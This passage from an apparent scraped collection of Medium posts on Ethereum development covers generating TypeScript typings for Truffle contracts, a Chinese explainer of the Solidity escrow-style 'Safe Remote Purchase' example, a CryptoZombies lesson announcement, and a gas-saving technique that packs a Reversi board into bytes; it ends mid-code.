TypeScript!Don\u2019t repeat yourselfTypings are nice, but it would be pain to update the type annotations every time we update a contract. Luckily, we can generate our type annotations too.Looking back at part of our ABI from before and the corresponding type annotations, we can see what information we need to compile into valid TypeScript source:{  \"constant\": false,  \"inputs\": [{ \"name\": \"beneficiary\", \"type\": \"address\" }],  \"name\": \"buyTokens\",  \"outputs\": [],  \"payable\": true,  \"type\": \"function\"}buyTokens(  beneficiary: Address,  options?: PayableTransactionOptions): Promise<void>;If we write a bit of code to traverse this JSON, we can then just visit each input and match it to a type we define in our generated TypeScript:// Simplified type mappingfunction translateType(type: SolidityType): string {  switch (type) {    case \"string\":      return \"string\";    case \"address\":      return \"Address\";    case \"bool\":      return \"boolean\";    case \"uint256\":      return 'number | BigNumber.BigNumber';    default:      throw `Unexpected case! ${type}`;  }}If we pull out the name of the function and do the same for the outputs (using TypeScript\u2019s tuple types) we can generate each functions source code. Once we generate interfaces for each contract, we can maintain a corresponding declaration file which maps our truffle requires to interfaces:// truffle.d.tsimport { SimpleSaleInstance } from \"./contracts\";declare global {  var artifacts: Artifacts;}interface Artifacts {  require(name: \"SimpleSale\"): Contract<SimpleSaleInstance>;}Now, our type definitions automatically work when we require the contract in our tests:Zero overhead type annotationsMy current solution is pretty rough, but it works. Checkout our sample repo to see how it works with a basic truffle project.Further readingCheckout the web3 typingsLook into Typechain. New project which I haven\u2019t used but I found after writing this postDid you enjoy this post? Follow our blog for future updates.", "responses": 3, "tags": ["Ethereum", "Blockchain", "Fintech", "Smart Contracts", "Developers"]}, {"title": "\u7dda\u4e0a\u8cfc\u7269\u5b89\u5168\u6a5f\u5236\u7684 Smart Contract", "post_link": "https://medium.com/taipei-ethereum-meetup/%E7%B7%9A%E4%B8%8A%E8%B3%BC%E7%89%A9%E5%AE%89%E5%85%A8%E6%A9%9F%E5%88%B6%E7%9A%84-smart-contract-5ce3e366cb2e?source=search_post", "author_name": "Yuren Ju", "author_link": "https://medium.com/@yurenju", "publish_date": "2017-09-12", "last_modified_date": "2018-05-11", "readtime": "5.43", "claps": 221, "voters": 53, "content": "\u7dda\u4e0a\u8cfc\u7269\u5b89\u5168\u6a5f\u5236\u7684 Smart ContractYuren JuFollowSep 12, 2017 \u00b7 6 min read\u9019\u500b\u6708\u56e0\u70ba\u6b63\u5728\u505a\u4e00\u500b\u77ed\u671f\u7684\u5408\u7d04\u6240\u4ee5\u975e\u5e38\u7684\u5fd9\uff0c\u73fe\u5728\u624d\u53c8\u6709\u7a7a\u56de\u4f86\u770b\u5340\u584a\u93c8\u7684 solidity \u8a9e\u8a00\uff0c\u5c31\u5148\u5f9e\u4e00\u500b\u7c21\u55ae\u7684\u958b\u59cb\u5427 :D\u672c\u6587\u6703\u76e1\u91cf\u7528\u4e0d\u9700\u8981\u6709\u7a0b\u5f0f\u57fa\u790e\u7684\u65b9\u5f0f\u6558\u8ff0\uff0c\u8b93\u66f4\u591a\u4eba\u53ef\u4ee5\u7406\u89e3\u3002Solidity \u5b98\u7db2\u7684\u6559\u5b78\u5176\u4e2d\u6709\u500b\u4f8b\u5b50\u662f \u201cSafe Remote Purchase\u201d\uff0c\u662f\u7528\u5340\u584a\u93c8\u5be6\u4f5c\u7dda\u4e0a\u8cfc\u7269\u7684\u5b89\u5168\u6a5f\u5236\uff0c\u8b80\u5230\u6642\u89ba\u5f97\u5f88\u6709\u610f\u601d\uff0c\u4ecb\u7d39\u7d66\u5927\u5bb6\u3002\u66f4\u65b0\uff1a\u4e0d\u904e\u8981\u6ce8\u610f\u5230\u9019\u5c31\u662f Solidity \u7a0b\u5f0f\u8a9e\u8a00\u6559\u5b78\u88cf\u6240\u9644\u7684\u7bc4\u4f8b\uff0c\u4e26\u4e0d\u662f\u5be6\u969b\u4e0a\u7dda\u4f7f\u7528\u7684\u3002\u5c31\u50cf\u6bd4\u5982\u6559 PHP \u7684\u66f8\u88e1\u9762\u6559\u5b78\u8981\u5982\u4f55\u64b0\u5beb\u4e00\u500b\u8cfc\u7269\u8eca\u7cfb\u7d71\u4e00\u6a23\uff0c\u8ddd\u96e2\u5be6\u969b\u4e0a\u7dda\u61c9\u7528\u9084\u6709\u6bb5\u8ddd\u96e2\uff0c\u4e0d\u904e\u53ef\u4ee5\u4e86\u89e3\u5176\u4e2d\u7684\u6982\u5ff5\u3002\u4ee5\u524d / \u76ee\u524d\u7684\u4ea4\u6613\u65b9\u6cd5\u5728\u6c92\u6709\u7dda\u4e0a\u8cfc\u7269\u7db2\u7ad9\u7684\u6642\u5019\uff0c\u5927\u5bb6\u90fd\u662f\u4e00\u624b\u4ea4\u9322\uff0c\u4e00\u624b\u4ea4\u8ca8\uff0c\u901a\u5e38\u90fd\u4e0d\u6703\u6709\u4ec0\u9ebc\u554f\u984c\u3002\u4e00\u624b\u4ea4\u9322\u4e00\u624b\u4ea4\u8ca8\uff0c\u901a\u5e38\u4e0d\u6703\u6709\u4ec0\u9ebc\u554f\u984c\u3002\u7576\u958b\u59cb\u53ef\u4ee5\u900f\u904e\u7dda\u4e0a\u8cfc\u7269\u5f8c\uff0c\u4e8b\u60c5\u5c31\u6709\u9ede\u4e0d\u4e00\u6a23\u4e86\u3002\u5927\u5bb6\u5728 PChome \u6216 Amazon \u4e0a\u600e\u9ebc\u78ba\u8a8d\u4f60\u6703\u6536\u5230\u6240\u8cfc\u8cb7\u7684\u6771\u897f\u5462\uff1f\u96d6\u7136\u6709\u8ffd\u8e64\u5546\u54c1\u76ee\u524d\u9001\u5230\u54ea\u88e1\u7684\u5de5\u5177\uff0c\u4f46\u662f\u5546\u5bb6\u6703\u4e0d\u6703\u78ba\u5be6\u51fa\u8ca8\u7d66\u4f60\uff0c\u4f9d\u9760\u7684\u662f\u5546\u5bb6\u8207\u5e73\u53f0\u7684\u4fe1\u7528\u8207\u6cd5\u5f8b\u898f\u7bc4\uff0c\u901a\u5e38\u662f\u4f60\u5148\u4ed8\u4e86\u9322\uff08\u6216\u662f\u4f7f\u7528\u4fe1\u7528\u5361\uff09\uff0c\u63a5\u8457\u4f9d\u9760\u5546\u5bb6\u7684\u4fe1\u7528\u8207\u6cd5\u5f8b\u898f\u7bc4\uff0c\u671f\u5f85\u4ed6\u6703\u51fa\u8ca8\u7d66\u4f60\u3002\u5982\u679c\u4ed6\u4e0d\u51fa\u8ca8\u7d66\u4f60\uff0c\u4ed6\u7684\u4fe1\u8b7d\u5c31\u6703\u53d7\u640d\uff0c\u6216\u8005\u5229\u7528\u6253\u5b98\u53f8\u900f\u904e\u6cd5\u5f8b\u61f2\u7f70\u4ed6\u7684\u884c\u70ba\u3002\u900f\u904e\u653f\u5e9c\u6216\u5e73\u53f0\u76e3\u7763\uff0c\u900f\u904e\u5408\u7d04\u6216\u6cd5\u5f8b\u7d04\u675f\u53e6\u5916\u4e00\u500b\u5e38\u7528\u7684\u65b9\u5f0f\u5c31\u662f\u8ca8\u5230\u4ed8\u6b3e\uff0c\u62ff\u5230\u5546\u54c1\u4e4b\u5f8c\u5728\u4ed8\u6b3e\u7d66\u7269\u6d41\u7684\u4eba\u4ee3\u6536\uff0c\u4e26\u4e14\u6700\u5f8c\u4ea4\u4ed8\u7d66\u5546\u5bb6\u3002\u900f\u904e\u7269\u6d41\u4ee3\u6536\u670d\u52d9\uff0c\u7531\u4e2d\u9593\u4eba\u7d93\u624b\u5546\u54c1\u8207\u91d1\u9322\u4e0d\u7ba1\u662f\u90a3\u7a2e\u65b9\u5f0f\uff0c\u4e2d\u9593\u90fd\u9700\u8981\u9760\u5408\u7d04\uff08\u6cd5\u5f8b\uff09\u7684\u7d04\u675f\u6216\u4e2d\u9593\u4eba\uff08\u7269\u6d41\u696d\u8005\u4ee3\u6536\u6216\u662f\u96fb\u5b50\u5546\u52d9\u5e73\u53f0\uff09\u4f86\u78ba\u8a8d\u96d9\u65b9\u6709\u62ff\u5230\u6b3e\u9805\u8207\u8ca8\u54c1\uff0c\u800c\u5176\u5be6\u9760\u5408\u7d04\u7684\u65b9\u5f0f\uff0c\u4e2d\u9593\u4eba\u4e5f\u53ea\u662f\u63db\u6210\u653f\u5e9c\u800c\u5df2\uff0c\u7528\u653f\u5e9c\u6210\u7acb\u7684\u6cd5\u5f8b\u4f86\u7d04\u675f\u9019\u4ef6\u4e8b\u60c5\u3002\u9019\u4e5f\u5c31\u662f\u5982\u679c\u6211\u5011\u770b\u5230\u4e00\u500b\u65b0\u7684\u96fb\u5546\u5e73\u53f0\uff0c\u5982\u679c\u662f\u500b\u964c\u751f\u7684\u54c1\u724c\u751a\u81f3\u7db2\u7ad9\u505a\u5f97\u5f88\u6389\u6f06\u6642\uff0c\u4f60\u53ef\u80fd\u5c31\u6703\u5c0d\u65bc\u4ed6\u7684\u4fe1\u8b7d\u7522\u751f\u61f7\u7591\uff0c\u9032\u800c\u4e0d\u9858\u610f\u4f7f\u7528\u9019\u500b\u5e73\u53f0\u3002\u4f7f\u7528\u5340\u584a\u93c8\u7684\u4ea4\u6613\u65b9\u6cd5\u5982\u679c\u4f7f\u7528\u5340\u584a\u93c8\uff0c\u8981\u600e\u9ebc\u8b93\u9019\u500b\u4ea4\u6613\u5728\u4e0d\u9700\u8981\u4e2d\u9593\u4eba\u7684\u5354\u52a9\u4e0b\u5b8c\u6210\u5462\uff1f\u9019\u5c31\u662f\u5b98\u7db2\u4e0a\u7684 Safe Remote Purchase \u6240\u4ecb\u7d39\u7684\u4e8b\u60c5\u3002\u5340\u584a\u93c8\u4e2d\u7684 Smart Contract (\u667a\u80fd\u5408\u7d04) \u662f\u4e00\u7a2e\u653e\u5728\u5340\u584a\u93c8\u4e0a\u7684\u5408\u7d04\uff0c\u6703\u4f9d\u7167\u5408\u7d04\u7684\u5167\u5bb9\u57f7\u884c\u5404\u7a2e\u5408\u7d04\u4e0a\u6240\u8a18\u8f09\u7684\u689d\u6587\u3002\u5982\u679c\u4f60\u719f\u6089\u8edf\u9ad4\u7a0b\u5f0f\u7684\u8a71\u63db\u7a2e\u65b9\u5f0f\u8b1b\uff1a\u667a\u80fd\u5408\u7d04\u5c31\u662f\u4e00\u6bb5\u5728\u5340\u584a\u93c8\u4e0a\u57f7\u884c\u7684\u7a0b\u5f0f\uff0c\u4efb\u4f55\u7a0b\u5e8f\u90fd\u6703\u4f9d\u7167\u6e90\u78bc\u4e0a\u6240\u64b0\u5beb\u7684\u65b9\u5f0f\u57f7\u884c\u3002\u800c\u667a\u80fd\u5408\u7d04\u900f\u904e\u5340\u584a\u93c8\u7684\u6a5f\u5236\uff0c\u78ba\u8a8d\u5408\u7d04\u7684\u57f7\u884c\u662f\u6c92\u6709\u906d\u5230\u507d\u9020\u7ac4\u6539\u7684\uff0c\u6211\u5011\u9019\u908a\u5c31\u4e0d\u63d0\u8981\u600e\u9ebc\u78ba\u8a8d\u4e0d\u53d7\u5230\u507d\u9020\u7ac4\u6539\uff0c\u90a3\u9700\u8981\u4e00\u9ede\u7bc7\u5e45\u89e3\u91cb\u3002\u65e2\u7136\u667a\u80fd\u5408\u7d04\u53ef\u4ee5\u4f9d\u7167\u5408\u7d04\u4e0a\u6240\u8a18\u8f09\u7684\u689d\u6587\u57f7\u884c\uff0c\u90a3\u9ebc\u76e3\u7763\u9019\u500b\u5408\u7d04\u6703\u78ba\u5be6\u5c65\u884c\u7684\u76e3\u7763\u8005\uff0c\u5c31\u4e0d\u9700\u8981\u662f\u653f\u5e9c\u6216\u662f\u898b\u8b49\u4eba\uff0c\u800c\u662f\u667a\u80fd\u5408\u7d04\u672c\u8eab\u5c31\u53ef\u4ee5\u76e3\u7763\u5408\u7d04\u7684\u5c65\u884c\u3002\u76f4\u63a5\u7531\u667a\u80fd\u5408\u7d04\u672c\u8eab\u76e3\u7763\u5408\u7d04\u7684\u5c65\u884c\uff0c\u4e0d\u9700\u8981\u4e2d\u9593\u4eba\u5982\u653f\u5e9c\u76e3\u7763\u56de\u5230\u6211\u5011\u60f3\u89e3\u6c7a\u7684\u554f\u984c\uff1a\u6211\u5011\u8981\u600e\u9ebc\u78ba\u8a8d\u5546\u5bb6\u6709\u5c07\u5546\u54c1\u7d66\u4f60\uff0c\u800c\u4f7f\u7528\u8005\u6709\u4ed8\u8cbb\u7d66\u5546\u5bb6\uff1f\u56e0\u70ba\u667a\u80fd\u5408\u7d04\u6703\u4f9d\u7167\u689d\u6587\u57f7\u884c\uff0c\u6211\u5011\u5c31\u4e0d\u9700\u8981\u63d0\u4f9b\u8ca8\u5230\u4ed8\u6b3e\u7684\u7269\u6d41\u696d\u8005\u6216\u662f\u653f\u5e9c\u76e3\u7763\u4f86\u89e3\u6c7a\u9019\u500b\u554f\u984c\uff0c\u6211\u5011\u53ef\u4ee5\u8b93\u8cb7\u8ce3\u96d9\u65b9\u90fd\u5148\u7e73\u7d0d\u4e00\u5b9a\u7684\u4fdd\u8b49\u91d1\uff0c\u4e26\u4e14\u5728\u78ba\u8a8d\u4ea4\u6613\u5b8c\u6210\u5f8c\uff0c\u518d\u5c07\u4fdd\u8b49\u91d1\u9000\u56de\u3002\u8ddf\u8ce3\u5bb6\u6536\u4fdd\u8b49\u91d1\u662f\u70ba\u4e86\u9632\u6b62\u4ed6\u6536\u4e86\u9322\u537b\u4e0d\u51fa\u8ca8\u7b49\u539f\u56e0\u8ddf\u8cb7\u5bb6\u6536\u4fdd\u8b49\u91d1\u662f\u70ba\u4e86\u9632\u6b62\u4ed6\u6536\u5230\u8ca8\u537b\u8b0a\u7a31\u4ed6\u6c92\u6536\u5230\u7b49\u539f\u56e0\u4ee5 \u201cSafe Remote Purchase\u201d \u9019\u500b\u7bc4\u4f8b\u4f86\u8aaa\uff0c\u5047\u8a2d\u6709\u4e00\u500b\u5ee0\u5546\u4eca\u5929\u8981\u8ce3\u4e00\u53f0\u7d04 10,000 \u53f0\u5e63\u7684\u624b\u6a5f\uff0c\u9996\u5148\u8ce3\u5bb6\u8981\u5148\u5efa\u7acb\u4e00\u500b\u667a\u80fd\u5408\u7d04\uff0c\u5728\u5efa\u7acb\u5408\u7d04\u7684\u540c\u6642\u8ce3\u5bb6\u9700\u8981\u5148\u7e73\u7d0d 20,000 \u5143\u7684\u4fdd\u8b49\u91d1\uff0c\u9019\u500b\u4fdd\u8b49\u91d1\u5982\u679c\u4ea4\u6613\u6c92\u6709\u5c65\u884c\u6216\u6c92\u6709\u4eba\u8cfc\u8cb7\u6642\u53ef\u4ee5\u53d6\u6d88\uff0c\u800c\u8ce3\u5bb6\u53ef\u4ee5\u62ff\u56de\u6240\u6709\u4fdd\u8b49\u91d1\u3002\u6b64\u6642\u82e5\u6709\u4e00\u500b\u8cb7\u5bb6\u60f3\u8981\u8cb7\u9019\u652f\u624b\u6a5f\uff0c\u4ed6\u53ef\u4ee5\u900f\u904e\u667a\u80fd\u5408\u7d04\u300c\u4ed8\u6b3e\u300d\uff0c\u4f46\u8ddf\u4e00\u822c\u4ea4\u6613\u4e0d\u540c\u7684\u5730\u65b9\uff0c\u5728\u65bc\u8cb7\u5bb6\u4e5f\u9700\u8981\u4ed8\u51fa\u984d\u5916\u7684\u4fdd\u8b49\u91d1\uff0c\u5728\u9019\u500b\u4f8b\u5b50\u4ed6\u4e5f\u8981\u4ed8\u51fa 20,000 \u7684\u91d1\u984d\uff0c\u4e00\u534a\u662f\u8cfc\u8cb7\u624b\u6a5f\u7684\u8cbb\u7528\uff0c\u53e6\u4e00\u534a\u662f\u4fdd\u8b49\u91d1\u3002\u6b64\u6642\uff0c\u9019\u500b\u667a\u80fd\u5408\u7d04\u4e2d\u5df2\u7d93\u6709\u4e86 40,000 \u5143\u7684\u91d1\u984d\u3002\u63a5\u4e0b\u4f86\uff0c\u8ce3\u5bb6\u6536\u5230\u8a02\u55ae\u5f8c\u5c31\u53ef\u4ee5\u5c07\u6b64\u624b\u6a5f\u51fa\u8ca8\u7d66\u8cb7\u5bb6\u3002\u7576\u8cb7\u5bb6\u6536\u5230\u624b\u6a5f\u6642\uff0c\u4ed6\u53ef\u4ee5\u5728\u667a\u80fd\u5408\u7d04\u4e0a\u8a3b\u8a18\u300c\u5df2\u78ba\u8a8d\u6536\u5230\u7269\u54c1\u300d\u3002\u6b64\u6642\u667a\u80fd\u5408\u7d04\u78ba\u8a8d\u4e86\u6574\u500b\u4ea4\u6613\u5df2\u7d93\u5b8c\u6210\uff0c\u6703\u9000\u7d66\u8cb7\u5bb6 10,000 \u5143\u7684\u4fdd\u8b49\u91d1\uff08\u4ed6\u539f\u672c\u7e73\u4e86 20,000 \u5143\uff0c\u4e00\u534a\u662f\u8cb7\u624b\u6a5f\u7684\u8cbb\u7528\uff0c\u53e6\u5916\u4e00\u534a\u662f\u4fdd\u8b49\u91d1\uff09\uff0c\u800c\u8ce3\u5bb6\u6b64\u6642\u5247\u6703\u6536\u5230 30,000 \u7684\u6b3e\u9805\uff0c\u5176\u4e2d 20,000 \u5143\u662f\u4fdd\u8b49\u91d1\uff0c10,000 \u5143\u662f\u552e\u51fa\u624b\u6a5f\u7684\u6b3e\u9805\u3002\u6700\u5f8c\u667a\u80fd\u5408\u7d04\u5e95\u4e0b\u4e0d\u6703\u6709\u4efb\u4f55\u7d50\u9918\u6b3e\u9805\u3002\u4e0a\u8ff0\u7684\u6240\u6709\u52d5\u4f5c\u90fd\u662f\u7531\u667a\u80fd\u5408\u7d04\u4f9d\u7167\u5408\u7d04\u7684\u5167\u5bb9\u57f7\u884c\uff0c\u6240\u4ee5\u4e0d\u6703\u6709\u4e2d\u9593\u4eba\uff0c\u7576\u7136\u4e5f\u4e0d\u6703\u6709\u7121\u6cd5\u4fe1\u4efb\u4e2d\u9593\u4eba\u7684\u554f\u984c\u3002\u5728\u9019\u6a23\u7684\u667a\u80fd\u5408\u7d04\u4e0b\uff0c\u8cb7\u5bb6\u8207\u8ce3\u5bb6\u90fd\u4e0d\u6703\u8f15\u6613\u7684\u4e0d\u9001\u51fa\u5546\u54c1\u6216\u662f\u4e0d\u78ba\u8a8d\u6536\u5230\u5546\u54c1\uff0c\u56e0\u70ba\u96d9\u65b9\u90fd\u653e\u4e86\u4e00\u5b9a\u50f9\u503c\u7684\u4fdd\u8b49\u91d1\u5728\u667a\u80fd\u5408\u7d04\u4e2d\uff0c\u53ea\u6709\u96d9\u65b9\u90fd\u5c65\u884c\u4e86\u8a72\u5c65\u884c\u7684\u689d\u6587\u5f8c\u624d\u6703\u6536\u5230\u9000\u6b3e\uff0c\u800c\u9019\u6a23\u7684\u904e\u7a0b\u4e2d\u5c31\u4e0d\u9700\u8981\u6709\u76e3\u7763\u8005\u4f86\u76e3\u7763\u5408\u7d04\u662f\u5426\u9032\u884c\uff0c\u56e0\u70ba\u96d9\u65b9\u5728\u6c92\u6709\u9054\u6210\u5408\u7d04\u6642\u6b0a\u76ca\u90fd\u6703\u53d7\u640d\uff0c\u6240\u4ee5\u90fd\u6703\u5118\u91cf\u9054\u6210\u5408\u7d04\uff0c\u7576\u7136\u5be6\u969b\u7684\u4ea4\u6613\u4e0d\u6703\u662f\u9019\u9ebc\u7c21\u55ae\uff0c\u53ef\u80fd\u6703\u6709\u5f88\u591a\u9000\u6b3e\u689d\u4ef6\uff0c\u4e0d\u904e\u5f9e\u9019\u500b\u4f8b\u5b50\u4e5f\u53ef\u4ee5\u7aba\u898b\u5340\u584a\u93c8\u5728\u9019\u6a23\u7684\u5834\u666f\u6709\u4ec0\u9ebc\u61c9\u7528\u3002\u56de\u982d\u4f86\u770b\uff0c\u5176\u5be6\u9019\u6a23\u7684\u6846\u67b6\u4e5f\u53ef\u4ee5\u7528\u4efb\u4f55\u516c\u53f8\u63d0\u4f9b\u7684\u670d\u52d9\u9054\u6210\uff0c\u6bd4\u5982\u8aaa\u6709\u516c\u53f8\u63d0\u4f9b\u9019\u6a23\u4fdd\u8b49\u91d1\u67b6\u69cb\u7684\u670d\u52d9\uff0c\u4e26\u4e14\u8ca0\u8cac\u7269\u6d41\uff0c\u4e5f\u53ef\u4ee5\u9054\u6210\u540c\u6a23\u7684\u76ee\u7684\u5c0d\u5427\uff1f\u4f46\u662f\u5982\u679c\u662f\u9019\u6a23\uff0c\u554f\u984c\u53c8\u56de\u5230\u4e86\u539f\u9ede\uff1a\u4f60\u8981\u600e\u9ebc\u78ba\u8a8d\u9019\u9593\u516c\u53f8\u53ef\u4ee5\u4fe1\u4efb\uff1f\u4ed6\u4e0d\u6703\u62ff\u4e86\u5169\u65b9\u7684\u9322\u5c31\u8dd1\u8def\u4e86\uff1f\u653f\u5e9c\u662f\u4e0d\u662f\u8981\u76e3\u7763\u9019\u9593\u516c\u53f8\uff1f\u53ea\u8981\u6709\u4e2d\u9593\u4eba\uff0c\u5c31\u6703\u6709\u4fe1\u4efb\u554f\u984c\u3002Ethereum \u5340\u584a\u93c8\u4f5c\u70ba\u4e00\u500b\u53ef\u4ee5\u4fe1\u4efb\u7684\u5206\u6563\u904b\u7b97\u7db2\u8def\uff0c\u5728\u4e0d\u9700\u8981\u4e2d\u9593\u4eba\u7684\u4ecb\u5165\u4e0b\u5c31\u53ef\u4ee5\u5b8c\u6210\u9019\u6a23\u7684\u4ea4\u6613\u3002\u5269\u4e0b\u552f\u4e00\u7684\u9650\u5236\uff0c\u5c31\u662f\u4f60\u7684\u60f3\u50cf\u529b\u4e86 :-)", "responses": 0, "tags": ["Ethereum", "Blockchain"]}, {"title": "CryptoZombies Lesson 6! The Phantom of Web3.js, MetaMask, Infura, and building front-ends for your DApps", "post_link": "https://medium.com/loom-network/cryptozombies-lesson-6-7133cee7ea8b?source=search_post", "author_name": "James Martin Duffy", "author_link": "https://medium.com/@jamesmartinduffy", "publish_date": "2018-04-02", "last_modified_date": "2019-08-19", "readtime": "1.33", "claps": 696, "voters": 50, "content": "CryptoZombies Lesson 6! The Phantom of Web3.js, MetaMask, Infura, and building front-ends for your DAppsJames Martin DuffyFollowApr 2, 2018 \u00b7 2 min readTo date, over 150,000 people from all over the world have used CryptoZombies to learn Solidity development.Google analytics reports we\u2019ve had users from 199 countries \u2014 that\u2019s more than the number of member states in the United Nations!In Lesson 5, we completed the Solidity smart contract portion of the tutorial. And today, we\u2019re happy to announce the release of Lesson 6, on Web3.js and building user-facing DApp front-ends!What\u2019s new in Lesson 6?Using Web3.js to talk to your smart contract from your web browserUsing MetaMask and Infura so your users can interact with your DAppSubscribing to smart contract events, and updating the app front-end in real-timeAnd more!Add another CryptoZombie to your army!Yeah, you knew we wouldn\u2019t leave you hangin\u2019.In typical CryptoZombies fashion, by completing Lesson 6, you\u2019ll add a bonus zombie to your army.To reflect the unique content contained in Lesson 6, this zombie is\u2026Unique \ud83d\ude09Yeah, you know you want this zombie.What are you waiting for? Get started with Lesson 6!If you get stuck, ask a question on DelegateCall. And as always, let us know if you have any feedback in our Telegram chat.P.S. Lesson 7 will be covering deploying your smart contracts to Ethereum. Stay tuned!Until next time\u2026Loom Network is the blockchain platform of choice for serious dapp developers \u2014 the Universal Layer 2 that provides developers the tools they need to build functional user-facing dapps today.New to Loom? Start here.Want to stake your LOOM tokens and help secure Loom Network? Find out how.And if you enjoyed this article and want to stay in the loop, go ahead and sign up for our private mailing list.", "responses": 2, "tags": ["Solidity", "Ethereum", "Programming", "Blockchain", "Coding"]}, {"title": "Reducing ETH Gas 23x by converting Arrays to Bytes", "post_link": "https://medium.com/@billyrennekamp/reducing-eth-gas-23x-by-converting-arrays-to-bytes-ccf3b46daea5?source=search_post", "author_name": "billy rennekamp", "author_link": "https://medium.com/@billyrennekamp", "publish_date": "2017-09-17", "last_modified_date": "2018-05-23", "readtime": "6.82", "claps": 329, "voters": 47, "content": "Reducing ETH Gas 23x by converting Arrays to Bytesbilly rennekampFollowSep 17, 2017 \u00b7 7 min readThis month (Aug/Sept 2017) I built my first Solidity Contract for the Ethereum Virtual Machine and ran into all sorts of pitfalls. The first one was realizing that some of the most trivial operations cost tons of gas, especially those involving Arrays and Loops. My contract was full of them and costing an arm and a leg, but I realized a way to refactor the Arrays into Bit Strings and use Bit Operators for reading and writing, then ultimately storing them as Bytes to save Millions in Gas.The Contract requires a user to submit chess notation moves of a complete game of Reversi (also known as Othello). If the moves play a valid game and if the endgame board is visually symmetrical, the user receives a reward in an ERC20 Token. Essentially it substitutes traditional mining with searching the massive game tree of Reversi as a Proof-Of-Work with a reward payout based on the rarity of the symmetry (for more details check out the about page). It wouldn\u2019t do for users to submit invalid but symmetrical games, so validation needed to take place on the contract. (If you\u2019re curious how the project turned out check it out at Clovers.network)https://goo.gl/images/CFzNq7The game Reversi is pretty easy to program but has a really large game tree (estimated to be 10\u2075\u2074 possible leaf nodes). That\u2019s why it was a good challenge for game heuristic research that wanted to avoid expensive lookahead. When modeling the game one typically uses a 2 dimensional array to keep track of the state of the 8x8 board and an array of up to 60 moves (each of which might also be an array of column and row positions). First I tackled the Board Array.BoardArray to ByteBoard// EXPENSIVE !!!uint8 EMPTY = 0;uint8 BLACK = 1;uint8 WHITE = 2;uint8[8][8] boardArray;boardArray[3][3] = WHITE;boardArray[3][4] = BLACK;boardArray[4][4] = WHITE;boardArray[4][3] = BLACK;I began representing empty squares with 0, black with 1 (since black moves first) and white as 2. This allowed everything within the 8x8 boardArray to be correctly assigned to an empty 0 by default (Solidity doesn\u2019t have an undefined property, everything defaults to some variation of 0 or false). This created an array that essentially looked like this:[[0,0,0,0,0,0,0,0], [0,0,0,0,0,0,0,0], [0,0,0,0,0,0,0,0], [0,0,0,2,1,0,0,0], [0,0,0,1,2,0,0,0], [0,0,0,0,0,0,0,0], [0,0,0,0,0,0,0,0], [0,0,0,0,0,0,0,0]]Which might as well have just been a really long string but represented as a binary value or hexadecimal value:String:000000000000000000000000000210000001200000000000000000000000000000000000Binary:0b00000000000000000000000000000000000000000000000000000010010000000000000110000000000000000000000000000000000000000000000000000000Decimal:10625432672847758622720Hexidecimal:0x2400180000000000000Later on down the road I got frustrated with prefixing the proper number of 0s when the board was partially empty so I decided to substitute the empty 0 for an empty 3, after all 3 still fits into 2 bits (0b11)which was all the space I wanted to spare for each square on the board.String:333333333333333333333333333213333331233333333333333333333333333333333333Binary:0b11111111111111111111111111111111111111111111111111111110011111111111110110111111111111111111111111111111111111111111111111111111Decimal:340282366920938456379662753540715053055Hexadecimal:0xFFFFFFFFFFFFFE7FFDBFFFFFFFFFFFFFThis new representation of the board is now so small it can fit into 128 bits, which is only 16 bytes (don\u2019t forget it\u2019s 8 bits per byte yall).// EXPENSIVE !!!// uint8 EMPTY = 0;// uint8 BLACK = 1;// uint8 WHITE = 2;// uint8[8][8] boardArray;// boardArray[3][3] = WHITE;// boardArray[3][4] = BLACK;// boardArray[4][4] = WHITE;// boardArray[4][3] = BLACK;// CHEAP !!!uint8 BLACK = 1;uint8 WHITE = 2;uint8 EMPTY = 3;bytes16 byteBoard;byteBoard = bytes16(340282366920938456379662753540715053055);Now all I had to do was figure out how to read and write to the byte string!Reading and Writing to ByteBoardFor this part of the work I\u2019m incredibly thankful to Maksym for his article on bitwise operators in Solidity. It was actually the first time I understood what bit operators were and how to use them\u2014I know I\u2019m late to the game but better late than never. After going over the idea of masking I set about creating a method for reading from my ByteBoard.Reading from ByteBoardTo read a selection of a binary string you need to first decide where that section is, create a mask of 1s, shift them over to that desired read point, and use an & operator to extract them. Finally shift them back the same amount and you\u2019ve got your value. Before building the mask I needed to find out where my desired read point was.I made a function that took column and row positions to help me determine the read point. I know that each tile consists of two bits to make up a Black tile 0x01 a White tile 0x10 or an Empty tile 0x11 so whatever my position is I\u2019ll have to double it eventually. I also know that each Row has 8 tiles so my placement would be (8 * col) + row. All of that is a description of how far from the beginning of the binary string it would be, but I need to know how far it is from the end, so I subtract that value from the total length of the 8x8 board (64 \u2014 (8*col) + row) . This would bring me to the end of my desired read location so I add back 1 place for the span of the mask and multiply by 2 for each bit:uint128 shiftAmount = posToPush(col, row);function posToPush (uint8 col, uint8 row) returns(uint128) {    return uint128( ( (64) - ( (8 * col) + row + 1) ) * 2);}Now I build a mask of two bits in length with both bits turned on (0x11). This will get moved on top of the read point of my target string in a new and otherwise empty string. The & bitwise operator will return a new string where the only bits on will be present in both previous strings. That way all of the tiles around my target will result in 0, and only the bits that were also present in my target will persist:function returnTile (bytes16 board, uint8 col, uint8 row) returns (uint8){    uint128 push = posToPush(col, row);    bytes16 mask = bytes16(3);    // 0b00000011 (mask)    mask = shiftLeft(mask, push);     // 0b00110000 (mask shifted if push was equal to 4)    bytes16 before = board & mask;     //  (board)0b01010101     // & (mask)0b00110000    // = (tile)0b00010000    bytes16 tile = shiftRight(before, push);    // 0b00000001 = 0b01 = 1 = Black Tile        return uint8(tile);     // returns 1}function shiftLeft (bytes16 a, uint128 n) returns (bytes16) {    uint128 shifted = uint128(a) * 2 ** uint128(n);    return bytes16(shifted);}function shiftRight (bytes16 a, uint128 n) returns (bytes16) {      uint128 shifted = uint128(a) / 2 ** uint128(n);      return bytes16(shifted);  }And now we know whether the tile at column X and row Y is equal to Black, White or Empty. (If you\u2019d like more info about the shifting functions check out Maksym\u2019s Article)Writing to ByteBoardIn order to write a new value to a specific point on our binary board we follow the same steps as reading, only using different bit operators. This time instead of extracting the value with a mask, we use it to clear out a space for our new tile using XOR, then write to it using OR.function turnTile (bytes16 board, uint8 color, uint8 col, uint8 row) returns (bytes16){    uint128 push = posToPush(col, row);    bytes16 mask = bytes16(3);    // 0b00000011 (mask)    mask = shiftLeft(mask, push);    // 0b00110000 (mask shifted if push was equal to 4)    board = ((board ^ mask) & board);    //   (board)0b01010101     // ^  (mask)0b00110000    // =        0b01100101    // & (board)0b01010101    // =        0b01000101    bytes16 tile = bytes16(color);    // 0b00000010 (if tile was White)        tile = shiftLeft(tile, push);    // 0b00100000 (tile shifted if push was equal to 4)    return board | tile;    //   (board)0b01000101     // | (tile) 